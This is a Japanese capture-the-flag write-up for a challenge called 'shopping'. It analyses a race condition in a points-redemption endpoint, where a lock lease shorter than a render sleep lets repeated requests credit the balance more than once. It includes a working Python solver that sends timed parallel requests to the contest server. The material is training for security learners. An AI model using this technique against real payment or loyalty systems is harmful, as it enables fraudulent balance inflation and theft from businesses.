## shopping
ゴール: flag 交換に必要なポイントを増やして、交換処理に到達すること

1. クーポン適用は即時加算ではない。
app.py の `redeem` はイベント作成寄り。最終加算は `statement` (app.py:456) 側で実施？
2. statement の処理順に競合余地がありそう。
`claim` (app.py:338) 後に render_delay で sleep が入る。

方針
- /support/statement を並列送信(20回送信)して確認 -> 応答は 202 accepted が多発。
- balance がほぼ 0 のまま進み、最後の 1 本で 70 になるケースを確認。
▼ 実験に用いたコードですが、うまく動いていません...。
```python
import requests
from concurrent.futures import ThreadPoolExecutor

BASE = "http://shopping.beginners.seccon.games:8000/"
session = requests.Session()

def s1_redeem():
    url = f"{BASE}/redeem"
    data = {"code": "SPECIAL_VOUCHER_FOR_CTF4B"}
    session.post(url, data=data)

def s2_statement(worker_id):
    url = f"{BASE}/support/statement"
    response = session.post(url, headers={"Accept": "application/json"})
    print(response.status_code, response.text)
    pass

def s3_check_balance():
    url = f"{BASE}/"
    response = session.get(url)
    print(response.text)
    pass

s1_redeem()

with ThreadPoolExecutor(max_workers=10) as executor:
    list(executor.map(s2_statement, range(20)))

s3_check_balance()

```

引き継ぎました。見てみると、確かに、/support/statementに対するレースコンディションなのですが、罠が仕込まれています。問題のプログラムを見ていきましょう。
```python=
def statement_timing(user_id: str, event_id: int):
    seed = hmac.new(
        RACE_SALT,
        f"statement:{user_id}:{event_id}".encode(),
        hashlib.sha256,
    ).digest()
    lease = (90 + seed[0] % 141) / 1000.0
    render_ratio = 1.25 + (seed[1] / 255.0) * 0.40
    audit_ratio = 8.0 + (seed[2] / 255.0) * 4.0
    return lease, lease * render_ratio, lease * audit_ratio
```
ここで、待ち時間が決められています。RACE_SALTはサーバー側の秘密です。それとuser_id, event_idからseedが作られています。そのseedを使って、ロックの有効期限leaseと、実際にsleepする時間render_delayが決められます。audit_ratioはあとで出てきます。次に、ロックの取得を行っている関数です。
```python=
def claim_statement_ticket(conn, user_id: str):
    token = secrets.token_hex(12)
    now = time()
    reprint_limit = 5

    row = conn.execute(
        """
        SELECT id, locked_until, review_until, claim_count
        FROM customer_events
        WHERE principal = ?
          AND applied_at IS NULL
        ORDER BY id
        LIMIT 1
        """,
        (user_id,),
    ).fetchone()
    if row is None:
        return None, None, None, None

    event_id = int(row["id"])

    if float(row["review_until"] or 0) > now:
        return None, None, None, None

    lease, render_delay, audit_delay = statement_timing(user_id, event_id)

    if float(row["locked_until"] or 0) > now:
        record_early_refresh(conn, event_id, now)
        return None, None, None, None

    if int(row["claim_count"] or 0) >= reprint_limit:
        return None, None, None, None

    cursor = conn.execute(
        """
        UPDATE customer_events
        SET locked_by = ?,
            locked_until = ?,
            early_refreshes = 0,
            claim_count = COALESCE(claim_count, 0) + 1
        WHERE id = ?
          AND principal = ?
          AND applied_at IS NULL
          AND COALESCE(review_until, 0) < ?
          AND COALESCE(locked_until, 0) < ?
          AND COALESCE(claim_count, 0) < ?
        """,
        (
            token,
            now + lease,
            event_id,
            user_id,
            now,
            now,
            reprint_limit,
        ),
    )
    if cursor.rowcount != 1:
        return None, None, None, None

    event = conn.execute(
        """
        SELECT id, name, topic, metadata
        FROM customer_events
        WHERE id = ?
        """,
        (event_id,),
    ).fetchone()
    return event, token, render_delay, audit_delay
```
まだ確定していないイベントを探します。review_until(ペナルティ期限)が未来なら、失敗します。また、locked_untilが未来(誰かがロック中)ならペナルティをもらい、失敗します。また、claim_countが5以上でも失敗します。上記すべてをクリアすると、UPDATEでロックを取得できるのですが、1行も更新できない(誰かに先を越される)場合も失敗します。ここで、出てきたペナルティについての関数がこれです。
```python=
def record_early_refresh(conn, event_id: int, now: float):
    row = conn.execute(
        """
        SELECT early_refreshes
        FROM customer_events
        WHERE id = ? AND applied_at IS NULL
        """,
        (event_id,),
    ).fetchone()
    if row is None:
        return

    misses = int(row["early_refreshes"]) + 1
    if misses > 2:
        conn.execute(
            """
            UPDATE customer_events
            SET early_refreshes = ?,
                review_until = ?,
                locked_until = ?
            WHERE id = ? AND applied_at IS NULL
            """,
            (misses, now + 1.2, now + 1.2, event_id),
        )
    else:
        conn.execute(
            """
            UPDATE customer_events
            SET early_refreshes = ?
            WHERE id = ? AND applied_at IS NULL
            """,
            (misses, event_id),
        )
```
ロック中にリクエストが来ると、ミスとして記録され、3回目のミスでreview_untilとlocked_untilにnow+1.2秒がセットされるので、claim_statement_ticket()の途中でどのイベントも突破できなくなる。そのため、レースコンディションするために、ほぼ同時でリクエストを出すと、ペナルティをもらいまくって、結局ずるできない。逆に、claim_statement_ticket()を成功したらどうなるのかを見ていく。
```python=
def reconcile_statement_batch(user_id: str):
    with db() as conn:
        event, token, render_delay, audit_delay = claim_statement_ticket(conn, user_id)
    if event is None:
        return {"accepted": True}

    metadata = json.loads(event["metadata"])
    balance_before = read_wallet_balance(user_id)
    document_id = make_statement_package(
        user_id,
        event["topic"],
        balance_before,
        metadata["template"],
        render_delay,
    )
    metadata["document"] = document_id

    with db() as conn:
        balance = post_ledger_adjustment(conn, user_id, int(metadata["delta"]))
        update_loyalty_profile(conn, user_id, balance)
        close_statement_ticket(conn, int(event["id"]), token, metadata)

    schedule_wallet_audit(user_id, audit_delay)

    return {"accepted": True}
```
失敗すると、この関数の最初のほうでreturnされるのに対し、成功すると、make_statement_package()内で、sleep(render_delay)が実行されるので、返ってくるのが遅くなる。このsleepしているタイミングを狙えば、ここに到達した時点で、post_ledger_adjustment()により、残高が+70されるので、レースコンディションが成立する。sleepのところを詳しく見てみると、
```python=
def make_statement_package(
    user_id: str,
    code: str,
    balance: int,
    template: str,
    render_delay: float,
):
    issued_at = f"{time():.6f}"
    sleep(render_delay)
    return hmac.new(
        APP_SECRET,
        f"{user_id}:{code}:{balance}:{template}:{issued_at}".encode(),
        hashlib.sha256,
    ).hexdigest()[:24]
```
leaseがrender_delayより短いため、このsleep中なら別のリクエストがロックを再取得できる。最後に、確定する関数がこれ。
```python=
def close_statement_ticket(conn, event_id: int, token: str, metadata: dict):
    cursor = conn.execute(
        """
        UPDATE customer_events
        SET applied_at = CURRENT_TIMESTAMP,
            metadata = ?,
            locked_by = NULL,
            locked_until = NULL
        WHERE id = ?
          AND locked_by = ?
          AND applied_at IS NULL
        """,
        (json.dumps(metadata, separators=(",", ":")), event_id, token),
    )
    return cursor.rowcount == 1
```
ここで、locked_by = tokenを条件にして、確定になる。でも、sleep中に別のリクエストがlocked_byを書き換えていれば、このUPDATEは失敗する。つまり、自分の+70は実行済みだが、確定処理だけ失敗する。これを踏まえて、
### solver.py
```python=
"""
方針:
  - 最初のリクエスト(req0)は必ず winner になる(誰もいないので)。
    その rt が render_delay(≈ lease * 1.25~1.65)になる。
  - early_refreshes > 2 を避けるため、req0 が走っている間に送る
    フォローアップは「ごく少数」に絞る。
  - render_delay が分からない状態で、複数の「フォローアップ送信タイミング」
    パターンを、新しいウォレット+redeemごとに変えて試す。
  - claim_count=2(balance>=140)になったら、即座に
    /cart/quote -> /exchange を叩いて 260 以上なら flag を取りに行く。
    (audit によって balance が元に戻るのは数秒後なので、その前に勝負する)
"""

import threading
import time

import requests

BASE_URL = "http://shopping.beginners.seccon.games:8000"
COUPON_CODE = "SPECIAL_VOUCHER_FOR_CTF4B"

FOLLOWUP_SETS = [
    [0.10, 0.15, 0.20, 0.25, 0.30, 0.35],
    [0.12, 0.17, 0.22, 0.27, 0.32, 0.37],
    [0.09, 0.14, 0.19, 0.24, 0.29, 0.34],
    [0.11, 0.16, 0.21, 0.26, 0.31, 0.36],
    [0.13, 0.18, 0.23, 0.28, 0.33, 0.38],
]

results = []
results_lock = threading.Lock()


def new_session():
    s = requests.Session()
    s.post(BASE_URL + "/wallet/new", allow_redirects=False)
    return s


def redeem(s):
    return s.post(BASE_URL + "/redeem", json={"code": COUPON_CODE})


def call_statement(s, label, delay):
    time.sleep(delay)
    t0 = time.time()
    try:
        r = s.post(BASE_URL + "/support/statement", json={}, timeout=10)
        dt = time.time() - t0
        balance = r.json().get("balance")
        with results_lock:
            results.append((label, delay, dt, balance))
    except Exception as e:
        with results_lock:
            results.append((label, delay, None, "error: " + str(e)))


def try_exchange(s, item="flag"):
    r = s.post(BASE_URL + "/cart/quote", json={"item": item})
    data = r.json()
    if not data.get("ok") or "quote" not in data:
        return None, data
    quote = data["quote"]
    r2 = s.post(BASE_URL + "/exchange", json={"quote": quote})
    return r2.json(), data


def run_batch(s, jobs):
    global results
    results = []
    threads = []
    for label, delay in jobs:
        threads.append(threading.Thread(target=call_statement, args=(s, label, delay)))
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    results.sort(key=lambda x: x[1])
    for label, delay, dt, balance in results:
        rt_str = ("%.3fs" % dt) if dt is not None else "?"
        print("  [%s] delay=%.3fs rt=%s balance=%s" % (label, delay, rt_str, balance))
    return max((b for _, _, _, b in results if isinstance(b, int)), default=0)


def attempt(followups):
    s = new_session()
    redeem(s)
    jobs = [("req0", 0.0)] + [("f%d" % i, d) for i, d in enumerate(followups, start=1)]
    max_balance = run_batch(s, jobs)
    return s, max_balance


def main():
    for attempt_no, followups in enumerate(FOLLOWUP_SETS, start=1):
        print("=== attempt %d (followups=%s) ===" % (attempt_no, followups))
        s, max_balance = attempt(followups)
        print("  -> max balance observed: %d" % max_balance)

        if max_balance >= 260:
            print("  balance >= 260! trying exchange immediately...")
            ex, quote_resp = try_exchange(s, "flag")
            print("  quote:", quote_resp)
            print("  exchange:", ex)
            if ex and ex.get("ok"):
                print("FLAG:", ex.get("flag"))
                return
        elif max_balance >= 140:
            print("  claim_count>=2 success! sending more followups quickly...")
            extra = [0.05, 0.08, 0.10, 0.12, 0.15, 0.18, 0.20, 0.22, 0.25, 0.28]
            jobs = [("x%d" % i, d) for i, d in enumerate(extra, start=1)]
            max_balance2 = run_batch(s, jobs)
            print("  -> max balance after extra: %d" % max(max_balance, max_balance2))
            max_balance = max(max_balance, max_balance2)
            if max_balance >= 260:
                ex, quote_resp = try_exchange(s, "flag")
                print("  quote:", quote_resp)
                print("  exchange:", ex)
                if ex and ex.get("ok"):
                    print("FLAG:", ex.get("flag"))
                    return

        print()

    print("全attempt終了。balance>=260 に到達しませんでした。")


if __name__ == "__main__":
    main()
```
結構aiに書いてもらった。また、成功確率は低め。何回かやれば、たまに成功する。